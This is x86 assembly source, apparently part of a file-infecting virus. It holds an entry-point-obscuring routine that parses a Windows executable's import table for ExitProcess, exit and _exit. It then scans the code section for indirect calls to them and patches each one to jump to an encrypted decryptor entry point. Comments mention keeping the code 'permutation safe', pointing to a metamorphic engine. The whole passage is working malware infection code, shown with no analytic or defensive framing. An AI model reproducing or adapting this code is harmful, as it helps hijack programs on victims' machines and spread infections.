EPO_to_lower:       push ecx
            push eax
            mov ecx,4
EPO_to_lower1:      cmp byte ptr [eax],5Ah
            ja EPO_to_lower2 
            cmp byte ptr [eax],41h
            jb EPO_to_lower2 
            add byte ptr [eax],20h
EPO_to_lower2:      inc eax
            dec ecx
            test ecx,ecx ; to make permutation safe
            jnz EPO_to_lower1
            pop eax
            pop ecx
            retn
;---------------------------------------------------------------------------;
;               EPO routine                 ;   
;---------------------------------------------------------------------------;
; find Va address of ExitProcess,exit,_exit FT
; get address of IT 
epo:            pushad
            sub esp,24
            mov esi,esp
                
            mov edi,esi
            xor eax,eax
            mov ecx,6
            rep stosd
                 
            mov eax,dword ptr [ebp].ptr_opt_header
            mov eax,dword ptr [eax + 104] ; IT
            ; does file have IT ?
            test eax,eax
            jz EPO_EXIT
            call RvaToRaw
            mov edx,eax 
                
            ; is dll kernel32 or msvcrt ?
check_dll:      cmp dword ptr [edx + 16],0 
            ja check_dll1
            jmp epo_spatch
    
check_dll1:     mov eax,dword ptr[edx + 12] ; Dll name RVA
            call RvaToRaw
            call EPO_to_lower
                
            cmp dword ptr [eax],'nrek'
            je proces_dll
            cmp dword ptr [eax],'cvsm'
            je proces_dll
EPO_next_dll:       add edx,20 ; size of directory entry
            jmp check_dll 
            
            ;uses oft ?
proces_dll:     cmp dword ptr [edx],0
            ja use_ft
            mov eax,dword ptr [edx + 16] ; get oft 
            jmp use_oft
use_ft:         mov eax,dword ptr [edx] ; import lookup table rva
use_oft:        call RvaToRaw
            mov ebx,eax
            xor ecx,ecx
                
EPO_check_api:      cmp dword ptr [ebx],0
            je EPO_next_dll
                
            mov eax,dword ptr [ebx]
            call RvaToRaw
            
            ; compare api name
            add eax,2
        
            cmp dword ptr [eax],'tixe'
            je EPO_found_exit 
            cmp dword ptr [eax],'ixe_'
            je EPO_found_exit
                    
            ; is ExitProcess 
            cmp dword ptr [eax],'tixE'
            jne EPO_next_1
            cmp dword ptr [eax + 4],'corP'
            jne EPO_next_1
            jmp EPO_found_exit      
                
EPO_next_1:     inc ecx
            add ebx,4
            jmp EPO_check_api
                
; now take the index of FT/OFT , find apropriate FT address and convert to VA 
EPO_found_exit:     push eax
            mov eax,dword ptr [edx + 16]
            lea eax,[eax + ecx * 4]
            push ebx
            mov ebx,dword ptr [ebp].ptr_opt_header
            add eax,dword ptr [ebx + 28] ; add image_base , convert to VA
            pop ebx
            add esi,4
            mov dword ptr [esi],eax
            pop eax
            jmp EPO_next_1

; find code section         
epo_spatch:     mov ebx,dword ptr [ebp].ptr_sect_headers

            assume ebx:ptr IMAGE_SECTION_HEADER
            mov eax,dword ptr [ebx].PointerToRawData
            add eax,dword ptr [ebp].ptrMappedImage 
            mov ecx,dword ptr [ebx].SizeOfRawData
                    
search_call:        cmp word ptr [eax],15FFh
            je is_good_call
            
            cmp word ptr [eax],25FFh
            je is_good_call 
        
search_cnt:     inc eax 
            dec ecx
            test ecx,ecx ; perm safe 
            jnz search_call 
                    
            ; exit epo routine 
EPO_EXIT:       add esp,24 ; clear vars
            popad
            retn 
            
            ; does VA points to FT of ExitProcess or other exits ?
is_good_call:       push eax
            mov eax,dword ptr [eax + 2] ; take va 
            push esi
                
is_good_loop:       cmp dword ptr [esi],0
            je EPO_bad_call
            cmp eax,dword ptr [esi]
            je patch_call ; is one of searched calls 
            sub esi,4
            jmp is_good_loop
                
EPO_bad_call:       pop esi
            pop eax
            jmp search_cnt
                
patch_call:     cmp dword ptr [ebp].epo_do_direct_call,0
            je epo_relative_patch
                    
            jmp epo_absolute_patch
                
epo_relative_patch: ; convert raw ptr of call to VA and count displacement
            mov eax,dword ptr [esp + 4] 
            call RawToVa
            test eax,eax
            jz EPO_bad_call
                
            inc dword ptr [ebp].number_of_epo_patches 
                
            mov ebx,dword ptr [ebp].decryptor_ep_VA     
            sub ebx,eax
            sub ebx,5
            mov eax,dword ptr [esp + 4]
            mov byte ptr [eax],0e8h
            inc eax
            mov dword ptr [eax],ebx
            jmp EPO_bad_call
                    
epo_absolute_patch: ; call/jmp dword ptr [mem32] patch 
            mov eax,dword ptr [esp + 4]
            mov ebx,dword ptr [ebp].decryptor_ep_VA 
            mov dword ptr [eax + 2],ebx
            inc dword ptr [ebp].number_of_epo_patches
            jmp EPO_bad_call  
                
